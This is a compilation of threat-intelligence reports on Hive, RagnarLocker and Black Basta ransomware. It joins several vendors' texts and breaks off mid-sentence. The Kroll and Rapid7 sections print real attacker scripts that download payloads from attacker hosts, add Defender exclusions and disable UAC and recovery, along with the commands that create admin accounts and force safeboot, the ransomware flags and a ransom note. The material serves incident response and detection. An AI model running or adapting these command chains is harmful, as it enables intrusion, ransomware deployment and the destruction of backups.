evaluated privileges by nircmd.exe.\n\npowershell Invoke-WebRequest \nhttps://cloudupdatesss[.]com/g5i0nq/index/f69af5bc8498d0ebeb37b801d450c046/?\nservername=msi -OutFile requestadmin.bat\n\npowershell Invoke-WebRequest \nhttps://cloudupdatesss[.]com/g5i0nq/index/c003996958c731652178c7113ad768b7/?\nservername=msi -OutFile nircmd.exe\n\n\ncmd  /c nircmd elevatecmd exec hide \"requestadmin.bat\"\n\nping  127.0.0.1 -n 20\n\nFigure 4: update.bat\n\nhttps://www.novapdf.com/\nhttps://www.nirsoft.net/utils/nircmd.html\n\n\n5/18\n\nThe “requestadmin.bat” then attempts to download further scripts named “runanddelete.bat”\nand “scripttodo.ps1”. The script itself also attempts to whitelist specific paths from Windows\nDefender before downloading Nsudo.exe. Nsudo provides capabilities to execute binaries\nwith elevated privileges, which are then used to edit the system registry to disable the user\naccess control prompt and to disable task manager and other registry tools. The Windows\npower system settings tool Powercfg is then executed to disable sleep, which will allow the\nthreat actor to maintain persistent access.\n\nhttps://nsudo.m2team.org/en-us/\n\n\n6/18\n\nset pop=%systemroot%\n\ncd %APPDATA%\n\npowershell Invoke-WebRequest \nhttps://cloudupdatesss[.]com/g5i0nq/index/a3874ddb552a5b45cade5a2700d15587/?\nservername=msi -OutFile runanddelete.bat\n\ncd %APPDATA%\n\npowershell Invoke-WebRequest \nhttps://cloudupdatesss[.]com/g5i0nq/index/fa777fbbb8f055cb8bfcba6cb41c62e7/?\nservername=msi -OutFile scripttodo.ps1\n\nstart /b PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"& \n'./scripttodo.ps1'\"\n\ndel nircmd.exe\n\ncmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -\nCommand Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming'\n\ncmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -\nCommand Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming\\'\n\n\n--- <snip> ---\n\n\npowershell Invoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/Bypass-\nTamper-Protection/main/NSudo.exe -outfile Nsudo.exe\n\nset pop=%systemroot%\n\nNSudo -U:T -ShowWindowMode:Hide reg add \n\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"  /v \n\"ConsentPromptBehaviorAdmin\" /t REG_DWORD /d \"0\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows \nDefender\\UX Configuration\"  /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add \n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" \n/t REG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add \n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableCMD\" /t \nREG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add \n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \n\"DisableRegistryTools\" /t REG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add \n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoRun\" /t \nREG_DWORD /d \"1\" /f\n\npowercfg.exe /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 1800\n\npowercfg -change -standby-timeout-dc 3000\n\npowercfg -change -standby-timeout-ac 3000\n\n\nstart /b \"\" cmd /c del \"%~f0\"&exit /b\n\n\nFigure 5: requestadmin.bat\n\nThe script “runanddelete.bat” appears to be a modified open-source script named “get-\nadmin.bat”. This script attempts to spawn the user access control prompt to gain the\nincreased privileges to then spawn an Administrator shell, via a created file named\n\nhttps://gist.github.com/Maximus5/a7fb0a11b3c33e5d96b0\n\n\n7/18\n\n“getadmin.vbs”. Once increased privileges are achieved, it then attempts to run Ursnif\n(d2ef5.exe).

This is likely an attempt to dump NTLM credential hashes for password cracking, or\nfor pass the hash techniques. PowerSploit has also been identified with attempts to run\n“Invoke-Kerberoast” to gain Kerberos ticket hashes for service accounts. This would likely\nprovide the threat actor with increased privileges or access if successful.\n\nMITRE ATT&CK: T1003.001: Credential Dumping – LSASS Memory\n\nMITRE ATT&CK: T1558.003: Kerberoasting\n\n\nMITRE ATT&CK: T1550: Use Alternate Authentication Material\n\nCommon remote access software such as Splashtop can be installed via Cobalt Strike to\nprovide a persistent, seemingly legitimate access to the network.

Kroll has observed\nthat threat actors have searched for files using PowerShell and manual traversal across files.\n\nMITRE ATT&CK: T1005: Data from Local System\n\nMITRE ATT&CK: T1567.002: Exfiltration Over Web Service : Exfiltration to Cloud Storage\n\n\nMITRE ATT&CK: T1020: Automate Exfiltration\n\nTo push the ransomware binary across the network, the sysinternals tool PsExec has been\nleveraged as well as custom scripts to deploy the encryptor. The ransomware binary itself\nappears to come in both 64 and 32 bit versions. To encrypt, the binary requires the login and\npassword \".\\windows_x64_encrypt.exe -u login:password”. There are other options available\nfor file encryption including:\n\n-local-only: Encrypt only local files.\n-no-discovery: Do not look for network shares.\n-explicit-only: Encrypt specific directories.\n\nBy default, the binary prevents recovery by deleting volume shadow copies “vssadmin.exe\ndelete shadows /all /quiet” and deletes system backups with “wbadmin.exe delete\nsystemstatebackup” and “wbadmin.exe delete catalog-quiet” before preventing recovery from\nboot with “\\bcdedit.exe /set {default} recoveryenabled No” and “bcdedit.exe\" /set {default}\nbootstatuspolicy ignoreallfailures”. The binary encrypts files, except for “.lnk” files and\nbinaries within “C:\\windows”, before generating two key files in the root of C:\\. The key files\nalso determine the extension string added to the encrypted files along with a base64\nencoded pointer.\n\nhttps://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/\n\n\n12/18\n\nYour network has been breached and all data were encrypted.                    \n\nPersonal data, financial reports and important documents are ready to disclose.\n\n\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at    \n\nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion/         \n\nyou will need to purchase our decryption software.   \n\n                         \n\nPlease contact our sales department at:   \n\n                                    \n\n  http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/      \n\n  \n\n     Login: <redacted> \n\n     Password: <redacted>\n\n\n  \n\nTo get an access to .onion websites download and install Tor Browser at:       \n\n  https://www.torproject[.]org/ (Tor Browser is not related to us) \n\n  \n\n  \n\nFollow the guidelines below to avoid losing your data:   \n\n                     \n\n- Do not modify, rename or delete *.key files.

You will lose them.                \n\n- Do not report to the Police, FBI, etc. They don't care about your business. \n\n  They simply won't allow you to pay. As a result you will lose everything.   \n\n- Do not hire a recovery company. They can't decrypt without the key.         \n\n  They also don't care about your business. They believe that they are        \n\n  good negotiators, but it is not. They usually fail. So speak for yourself.  \n\n- Do not reject to purchase. Exfiltrated files will be publicly disclosed.\n\n\nFigure 10: HOW_TO_DECRYPT.txt\n\nMITRE ATT&CK: T1570 : Lateral Tool Transfer\n\nMITRE ATT&CK: T1490 : Inhibit System Recovery\n\n\nMITRE ATT&CK: T1486 : Data Encrypted for Impact\n\nOnce data has been extracted and encrypted, victims are directed to their customer page to\nnegotiate the ransom fee.

Monitoring\nPowerShell execution can identify malicious activity\nassociated with Cobalt Strike.\n\n\n\n16/18\n\nEnable credential guard\n\nWindows Credential Guard can\nprovide protection against\npassword extraction and other\nauthentication attacks.\n\nThe threat actor dumped LSASS and conducted\nKerberos attacks. Credential guard can offer some\nprotection against these attacks.\n\nAudit user, administrator and\nservice accounts\n\nEnsure accounts have the\ncorrect access and privileges.\nImplement the principle of least\nprivilege.\n\nThe threat actor is often able to install tools on user\nendpoints. Limiting the privileges of users can prevent\na threat actor from installing malicious software.\n\nImplement multi-factor\nauthentication\n\nMulti-factor authentication can\nrestrict access to sensitive areas\nand can prevent lateral\nmovement.\n\nEnabling multi-factor authentication can prevent a\nthreat actor from moving laterally and accessing\nsensitive data.\n\nReview backup strategies\n\nEnsure multiple backups are\ntaken and at least one backup is\nisolated from the network.\n\nAs a ransomware actor’s main aim is to disrupt\nbusiness, ensuring a viable backup and recovery\nstrategy is in place can allow a business to recover\nquickly.\n\nReview remote access tools Threat actors leverage legitimate remote access tools\nto maintain persistence. Ensure remote access is\nmonitored and that only approved remote access tools\nexist in the environment.\n\nIndicators of Compromise\n\nThe following files and hashes have been identified for the incident:\n\nFile Name Comment MD5 Hash Value\n\nInstallerV36 (244).msi Batloader MSI 66a0bfcb41071d971f6003de9c2d2840\n\nScripttodo.ps1 Batloader Script ab60761a7016b2b2b883e3a15ef4fecc\n\nhttps://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard\n\n\n17/18\n\nFile Name Comment MD5 Hash Value\n\nRequestadmin.bat Batloader Script 10fcffe4ad2cb37d6dc351ff975b0058\n\nRunanddelete.bat Batloader Script 5cb9d80f82f674b065c3d80816a370c4\n\nUpdate.bat Batloader Script bcf4f2d188a9b855a5e198ad8fbff500\n\nProcdump64.exe ProcDump64 used\nto dump LSASS\n\n170637b901dc67cda3d905a714096a7f\n\nFind.exe Renamed ADfind df5ce1159ef2e257df92e1825d786d87\n\nwindows_x64_encrypt.exe Ransomware\nBinary\n\n8fba0d57696ccf672ddcea4ba4d0e885\n\ngpg4win-2.2.5.exe GNU Privacy Guard 67a4f35cae2896e3922f6f4ab5966e2b\n\nf827.exe Syncro Installer 58f8600ee94571beff3224f75601f0fa\n\nThe following external IP addresses were observed during the incident:\n\nIP Address Comment\n\n46.30.42[.]56 caroseyama[.]xyz\n\n194.67.119[.]190 cloudupdatesss[.]com\n\n45.8.158[.]104 http://45.8.158[.]104/uploaded\n\n37.140.192[.]70 teamviewclouds[.]com\n\nStay Ahead with Kroll\n\nCyber Risk\n\n\n\n18/18\n\nIncident response, digital forensics, breach notification, managed detection services,\npenetration testing, cyber assessments and advisory.\n\n24x7 Incident Response\n\nEnlist experienced responders to handle the entire security incident lifecycle.\n\nComputer Forensics\n\nKroll's computer forensics experts ensure that no digital evidence is overlooked and assist at\nany stage of an investigation or litigation, regardless of the number or location of data\nsources.\n\nCyber Risk Retainer\n\nKroll delivers more than a typical incident response retainer—secure a true cyber risk\nretainer with elite digital forensics and incident response capabilities and maximum flexibility\nfor proactive and notification services.\n\nRansomware Preparedness Assessment\n\nKroll’s ransomware preparedness assessment helps your organization avoid ransomware\nattacks by examining 14 crucial security areas and attack vectors.\n\nData Recovery and Forensic Analysis\n\nKroll's expertise establishes whether data was compromised and to what extent.

One objective of this research is to discover new techniques\nbeing used in the wild, so we can develop new detection and response capabilities.\n\nRecently, Rapid7 observed a malicious actor performing several known techniques for\ndistributing ransomware across many systems within a victim’s environment. In addition to\nthose techniques, the actor employed a number of previously unseen techniques designed to\nto drop the defenses of the victim, inhibit monitoring, disable networking and allow time for\nthe ransomware to finish encrypting files. These extra steps would make it extremely difficult,\nif not impossible, for a victim to effectively use their security tools to defend endpoints after a\ncertain point in the attack.\n\nRapid7 has updated existing and added new detections to InsightIDR to defend against\nthese techniques. In this article, we’ll explore the techniques employed by the threat actor,\nwhy they’re so effective, and how we’ve updated InsightIDR to protect against them.\n\nWhat approach did the malicious actor take to prepare the victim's\nenvironment?\n\nInitially using Cobalt Strike, the malicious actor retrieved system administration tools and\nmalicious payloads by using the Background Intelligent Transfer Service (BITSAdmin).\n\n\"C:\\Windows\\system32\\bitsadmin.exe\" /transfer debjob /download /priority normal \nhttp://79.137.206.47/PsExec.exe C:\\Users\\Public\\PsExec.exe\n\n\nbitsadmin  /transfer debjob /download /priority normal http://79.137.206.47/int.exe \nC:\\Windows\\int.exe\n\n\nThe malicious actor then began using the remote process execution tool PSExec to execute\nbatch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions\n(RDP) using reg.exe. This enabled the malicious actor to laterally move throughout the\nvictim’s environment using the graphical user interface.\n\nhttps://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/\nhttps://www.cobaltstrike.com/\nhttps://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/psexec\nhttps://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-localsessionmanager-fdenytsconnections\n\n\n2/13\n\nPSEXESVC.exe: C:\\Windows\\PSEXESVC.exe└──cmd.exe: C:\\Windows\\system32\\cmd.exe /c \n\"\"rdp.bat\" \"└── reg.exe: reg  add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal \nServer\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f\n\n\nRapid7 observed the malicious actor add/change policies for the Active Directory domain to\nperform the following:\n\n1. Copy down batch scripts\n2. Execute batch scripts (file1.bat), which:\n3. Creates administrator account on the local system\n4. Reconfigures boot configuration data (bcdedit.exe) so that the host will not load any\n\nadditional drivers or services (ie: network drivers or endpoint protection)\n5. Sets various registry values to ensure the created local administrator user will\n\nautomatically logon by default\n6. Changes the Windows Shell from Explorer to their malicious script (file2.bat)\n7. Reboots the system with the shutdown command\n8. On reboot, the system logs in and executes the shell (file2.bat), which:\n9. Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7-\n\nZip's console executable (7zr.exe)\n10. Executes the ransomware payload (int.exe or int64.exe)\n\nBelow are some commands observed executed by the malicious actor (with necessary\nredactions):\n\nhttps://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bcdedit\nhttps://en.wikipedia.org/wiki/Windows_shell\n\n\n3/13\n\nxcopy.exe /C/Q/H/Y/Z \n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies \n{<REDACTED>}\\Machine\\Scripts\\Startup\\file1.bat\" \"C:\\windows\"\n\nxcopy.exe /C/Q/H/Y/Z \n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\\n{<REDACTED>}\\Machine\\Scripts\\Startup\\file2.bat\" \"C:\\windows\"\n\nxcopy.exe /C/Q/H/Y/Z \n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\\n{<REDACTED>}\\Machine\\Scripts\\Startup\\7zr.exe\" \"C:\\windows\"\n\nxcopy.exe /C/Q/H/Y/Z \n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\{<REDACTED>}\\Machine\\Scripts\\Startup\\int.7z\" \n\"C:\\windows\\\"\n\nC:\\WINDOWS\\SYSTEM32\\cmd.exe /c \"C:\\windows\\file1.bat\"\n\nnet  user <REDACTED> <REDACTED> /add\n\nC:\\WINDOWS\\system32\\net1  user <REDACTED> <REDACTED> /add\n\nnet  user <REDACTED> /active:yes\n\nC:\\WINDOWS\\system32\\net1  user <REDACTED> /active:yes\n\nnet  localgroup Administrators <REDACTED> /add\n\nC:\\WINDOWS\\system32\\net1  localgroup Administrators <REDACTED> /add\n\nbcdedit  /set {default} safeboot minimal\n\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \nLegalNoticeText /t REG_SZ /d \"\" /f\n\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \nLegalNoticeCaption /t REG_SZ /d \"\" /f\n\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \nLegalNoticeText /t REG_SZ /d \"\" /f\n\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \nLegalNoticeCaption /t REG_SZ /d \"\" /f\n\nreg  add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \nAutoAdminLogon /t REG_SZ /d 1 /f\n\nreg  add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \nDefaultUserName /t REG_SZ /d <REDACTED> /f\n\nreg  add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \nDefaultPassword /t REG_SZ /d <REDACTED> /f\n\nreg  add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \nAutoLogonCount /t REG_DWORD /d 1 /f\n\nreg  add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t \nREG_SZ /d \"C:\\windows\\file2.bat\" /f\n\nshutdown  -r -f -t 10 -c \"Computer Will Now Restart In SAFE MODE...\"\n\n\nRapid7 also observed the malicious actor extracting HIVE ransomware payload using 7zip's\nconsole application (7zr.exe) from encrypted 7zip archive (int.7z) with a simple password\n(123):\n\n\"C:\\windows\\7zr.exe\" x c:\\windows\\int.7z -p123 -oc:\\windows\n\nThe malicious actor then manually executed the ransomware (int.exe) once with only the\nrequired username:password combination passed to the -u flag. This presumably encrypted\nthe local drive and also all network shares the user had access to:\n\"C:\\Windows\\int.exe\" -u <REDACTED>:<REDACTED>\"\n\n\n\n4/13\n\nThe malicious actor also manually executed the 64 bit version of the ransomware\n(int64.exe) once on a different host with the -no-discovery flag. This is likely intended to\noverride the default behavior and not discover network shares to encrypt their files. The -u\nflag was also passed and the same values for the username:password were provided as\nseen on the other host.\n\nC:\\Windows\\int64.exe  -u <REDACTED>:<REDACTED> -no-discovery\n\nWhy is this approach so effective?\n\nDeployment of ransomware using Active Directory group policies allows the malicious actor\nto hit all systems in the environment for as long as that group policy is active in the victim’s\nenvironment. In this case, any system that was booting and connected to the environment\nwould receive the configuration changes, encrypted archive containing the ransomware, a\ndecompression utility to extract the ransomware, configuration changes and the order to\nreboot and execute. This can be especially effective if timed with deployments of patches\nthat require a reboot, done at the beginning of the day or even remotely using Powershell's\nStop-Computer cmdlet.\n\nStoring the ransomware within a 7zip encrypted archive  (int.7z) with a password even as\nsimple as (123) makes the task of identifying the ransomware on disk or transmitted across\nthe network nearly impossible. This makes retrieval and staging of the malicious actors\npayload very difficult to spot by security software or devices (Antivirus, Web Filtering,\nIDS/IPS and more). In this case, the malicious actor has taken care to only put the encrypted\ncopy on the disk of a victim’s system and not execute it until they have fully dropped the\ndefenses on the endpoint.\n\nReconfiguring the default boot behavior to safeboot minimal and then executing a reboot\nunloads all but the bare minimum for the Windows operating system. With no additional\nservices, software or drivers loaded the system is at its most vulnerable. With no active\ndefenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined\nshell which has been swapped to a batch script (file2.bat) by the malicious actor.\n\nIt should be noted that in this state, there is no method of remotely interacting with the\nsystem as no network drivers are loaded. In order to respond and halt the\nransomware, each host must be physically visited for shutdown. Manually priming the\nhost in this way is more effective than the existing capabilities of the HIVE ransomware which\nstops specific defensive services (Windows Defender, etc) and kills specific processes prior\nto encrypting the contents of the drive.\n\nAll systems in this state are left automatically logged in as an administrator, which gives\nanyone who has physical access complete control. Lastly, the system will continue to boot\ninto safeboot minimal mode by default (again, no networking) until each system is set back to\n\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-computer?view=powershell-7.3\n\n\n5/13\n\nits original state with a command such as below. Bringing the host back online in this state\nwill still continue to execute the malware when logged into, which will also enable the default\nnetwork spreading behavior.\n\nbcdedit /deletevalue {default} safeboot\n\nLastly, the malicious actor also manually executed the payload a few times on systems that\nhad not been put into safeboot minimal and rebooted. Systems they executed with only the\n-u flag actively searched out network shares they had access to and encrypted their\ncontents. This ensures that only the intended hosts do network share encryption and all\nthose that were rebooted into safeboot minimal do not flood the network simultaneously\nencrypting all files. It also means that the contents of network file shares that are not\nWindows based (various NAS devices, Linux hosts using Samba) will be encrypted even if\nthe payload is not actually deployed on that specific host. This approach would be extremely\ndestructive to both corporate environments and home users with network attached storage\nsystems for backups. Rapid7 notes that ThreatLocker have reported on similar activity in\ntheir knowledge base article entitled Preventing BCDEdit From Being Weaponized.\n\nMalware analysis of HIVE sample\n\nRapid7 observed that the HIVE payload would not execute unless a flag of -u was passed.\nDuring analysis it was discovered that passing -u asdf:asdf would result in the Login and\nPassword (colon-delimited) provided to the victim to authenticate to the site behind the onion\nlink on the TOR network:\n\nhttps://threatlocker.com/\nhttps://threatlocker.kb.help/preventing-bcdedit-from-being-weaponized/\n\n\n6/13\n\n\n\nThis, and other behaviors were previously reported on by Microsoft's article Hive\nRansomware Gets Upgrades in Rust and also by Sophos in their Github Repository of IoC's\nmentioned in their article Lockbit, Hive, and BlackCat attack automotive supplier in triple\nransomware attack. There have been some flags that are noted to exist, but their features\nare not documented. Rapid7 has analyzed the behaviors of these flags, documented them in\naddition to discovering two new flags (-timer, -low-key) in the HIVE ransomware samples.\n\nThe new flags -t, -timer, --timer effectively cause the malware to wait the specified\nnumber of seconds before going on to perform its actions. The other new flags -low-key, -\n-low-key will cause the ransomware to focus on only its encryption of data and not perform\npre-encryption tasks, including deleting shadow copies (malicious use of vssadmin.exe,\nwmic.exe), deleting backup catalogs (malicious use of wbadmin.exe), and disabling Windows\nRecovery Mode (malicious use of bcdedit.exe). These features give the malicious actor\nmore control over how/when the payload is executed and skirt common methods of\ncommand line and parent/child process related detection for most ransomware families.\n\nFundamentally, the sample’s respective flags distill down into encryption operations of local,\nmount and discovery.  The local module utilizes the LookupPrivilegeValueW and\nAdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and\nOpenProcessToken to obtain SeDebugPrivilege privileges.  This is presumably crucial for\nOpenProcess -> OpenProcessToken -> ImpersonateLoggedOnUser API call attempts to\n\nhttps://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/\nhttps://github.com/sophoslabs/IoCs/blob/master/Ransomware_Hive%20-%20triple%20ransomware%20attack.csv\nhttps://news.sophos.com/en-us/2022/08/10/lockbit-hive-and-blackcat-attack-automotive-supplier-in-triple-ransomware-attack/\nhttps://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew\nhttps://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges\nhttps://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess\nhttps://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken\nhttps://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess#remarks:~:text=To%20open%20a%20handle%20to%20another%20local%20process%20and%20obtain%20full%20access%20rights%2C%20you%20must%20enable%20the%20SeDebugPrivilege%20privilege.%20For%20more%20information%2C%20see%20Changing%20Privileges%20in%20a%20Token.\nhttps://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken\nhttps://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser\n\n\n7/13\n\nprocesses: winlogon.exe and trustedinstaller.exe to subsequently stop security\nservices and essential processes, if the --low-key is not passed during execution.\n ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe,\nnotepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and\nransom note display purposes. The mount module will use NetUseEnum to identify the\ncurrent list of locally-mounted network shares and add them to the list to be encrypted.\nLastly, the discovery module will use NetServerEnum to identify available Windows hosts\nwithin the domain/workgroup. This list is then used with NetShareEnum to identify file shares\non each remote host and add them to the list of locations to have their files encrypted.\n\nBy default, all three modes (local, mount and discovery)are enabled, so all local, mounted\nand shares able to be enumerated will have their contents encrypted. This effectively\nransoms all systems in a victim’s environment with a single execution of HIVE—when\nperformed by a privileged user such as a Domain or Enterprise Admin account. Command\nline flags may be used to change this behavior and invoke one or more of the modules.

However, since the malicious actor is rebooting into safemode minimal\nstate, endpoint protection software and networking will not be running while the endpoint is\nexecuting ransomware.\n\nSo, identifying the actions of a malicious actor before ransomware is deployed is crucial to\npreventing the attack. In other words, it is essential to identify malicious actors within the\nenvironment and eject them before the ransomware payload is dropped.\n\nThe following detections are now available InsightIDR to identify this attacker behavior.\n\nAttacker Technique -

This is\nthe second FBI alert released for the RagnarLocker Ransomware variant, the last alert was\nreleased in November 2020.\n\nThe following FBI flash alerts will focus on providing indicators of compromise (IOCs) that\norganizations can use to detect and block RagnarLocker ransomware attacks.\n\nMarch 2022 FBI Alert (PDF) - RagnarLocker Ransomware Indicators of Compromise\n\nNovember 2020 FBI Alert (PDF) - RagnarLocker Ransomware Indicators of Compromise\n\nRagnarLocker ransomware first appeared in the wild at the end of December 2019 as part\nof a campaign against compromised networks targeted by its operators. The actors behind\nRagnarLocker will perform reconnaissance on the targeted network, exfiltrate sensitive\ninformation, encrypt files, and then notify the victim the stolen files will be released to the\npublic if the ransom is not paid. The threat actor behind the malware is known in previous\nattacks to ask for millions of dollars in payment and creates a ransom note that includes the\ncompany name. The ransomware enumerates all running services on the infected host and\nstops services that contain a specific string. Ragnar is small compared to other malware\nand is written in the C/C++ programming language.\n\nhttps://www.ic3.gov/Media/News/2022/220307.pdf\nhttps://www.waterisac.org/system/files/articles/FLASH-MU-000140-MW.pdf\n\n\n3/10\n\nFigure 1.

Learn more about this new ransomware and\nfortify your organization’s defenses against this threat. \n\n View infographic of \"Ransomware Spotlight: Black Basta\"\n\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\nhttps://documents.trendmicro.com/images/TEx/infographics/RS-Black-Basta-Infographic-E8YY1Tw.jpg\n\n\n2/12\n\nBlack Basta is a ransomware group operating as ransomware-as-a-service (RaaS) that was initially spotted in April 2022. It has since proven\nitself to be a formidable threat, as evidenced by its use of double-extortion tactics and expansion of its attack arsenal to include tools like the\nQakbot trojan and PrintNightmare exploit.\n\nDetections of the Black Basta ransomware are currently low, likely because of how recently it was discovered. And like most modern\nransomware, Black Basta has a more targeted approach to choosing its victims rather than relying on spray-and-pray tactics. However, the\nspeed with which its malware authors have augmented their attack arsenal and developed a new Linux build merits further investigation of the\nemerging ransomware gang behind it.\n\nWhat organizations need to know about Black Basta\n\n\n\n\nThe Black Basta ransomware group quickly gained notoriety after it laid claim to massive breaches earlier this year. On April 20, 2022, a user\nunder the name “Black Basta” sought out corporate network access credentials on underground forums in exchange for a share of the profits\nfrom their ransomware attacks. Specifically, the user was in the market for credentials that could compromise organizations based in English-\nspeaking countries, including Australia, Canada, New Zealand, the UK, and the US.\n\nTwo days later, the American Dental Association (ADA) suffered a cyberattack that led it to shutter multiple systems. Data allegedly stolen from\nthe ADA was published on the Black Basta leak site only 96 hours after the attack.\n\nWhile it was previously assumed that the ransomware group used bought or stolen corporate network access credentials to infiltrate its victims’\nnetworks, our analysis of another set of samples monitored within a 72-hour time frame shows a possible correlation between the Qakbot\ntrojan and the Black Basta ransomware. Black Basta continued to evolve, and in June, a Linux build of the ransomware that encrypts VMware\nESXi virtual machines was discovered in the wild.\n\nInterestingly, the ransomware group does not appear to distribute its malware at random. That Black Basta’s operators have turned to\nunderground markets to acquire network access credentials and have hard-coded a unique ID in every Black Basta build betrays their mature\nunderstanding of how ransomware works as a business. While Black Basta may be a newly formed group, the individuals behind it are likely\nseasoned cybercriminals.\n\nTop affected countries and industries according to Trend Micro data\n\nIn this section, we discuss Trend Micro™ Smart Protection Network™ data on Black Basta’s activity from April 1 to July 31, 2022, which refers\nto detections of the ransomware’s attempts to compromise organizations.\n\nJust two countries accounted for over half of the group’s 44 ransomware attack attempts during this period, which were concentrated in the US\nat 43%, with Austria a distant second at 15%. As Black Basta has sought to purchase network access credentials for organizations located\nspecifically in the US, among other countries, this may explain the higher number of attacks against US-based businesses.\n\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware-as-a-service-raas\nhttps://www.bleepingcomputer.com/news/security/new-black-basta-ransomware-springs-into-action-with-a-dozen-breaches/\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://www.trendmicro.com/en_us/research/22/f/black-basta-ransomware-operators-expand-their-attack-arsenal-wit.html\nhttps://www.trendmicro.com/en_us/research/21/k/qakbot-loader-returns-with-new-techniques-and-tools.html\nhttps://www.trendmicro.com/en_us/research/21/h/detecting-printnightmare-exploit-attempts-with-trend-micro-vision-one-and-cloud-one.html\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware\nhttps://cyware.com/research-and-analysis/lets-talk-about-black-basta-ransomware-an-in-depth-analysis-7a19\nhttps://www.bleepingcomputer.com/news/security/american-dental-association-hit-by-new-black-basta-ransomware/\n\n\n3/12\n\n\n\n\nFigure 1. The countries with the most Black Basta ransomware attack attempts in terms of infected machines from April 1 to July 31, 2022 \n\nSource: Trend Micro™ Smart Protection Network™\n\nAs of this writing, our detections show that Black Basta activity is spread across many different industries. The group has been observed\ntargeting businesses involved in technology, insurance, manufacturing, and utilities.\n\nAlthough Black Basta is a relatively new arrival to the ransomware scene, its detections have been on a steady climb since the ransomware\ngang surfaced in April, peaking at 22 attack attempts in June before tapering down to 11 the following month.\n\n\n\n4/12\n\nFigure 2. The numbers of detections of Black Basta ransomware attack attempts in terms of infected machines in each month from April 1 to\nJuly 31, 2022 \n\n\nSource: Trend Micro Smart Protection Network\n\nTargeted regions and industries according to Black Basta’s leak site\n\nIn this section, we look into the attacks recorded on the Black Basta group’s leak site, which represent successfully compromised\norganizations that, as of this writing, have refused to pay ransom. Our detections, which pertain to Trend Micro customers, captured only a\nfraction of the victims found in Black Basta’s leak site. Trend Micro’s open-source intelligence (OSINT) research and investigation of the site\nshow that from April 1 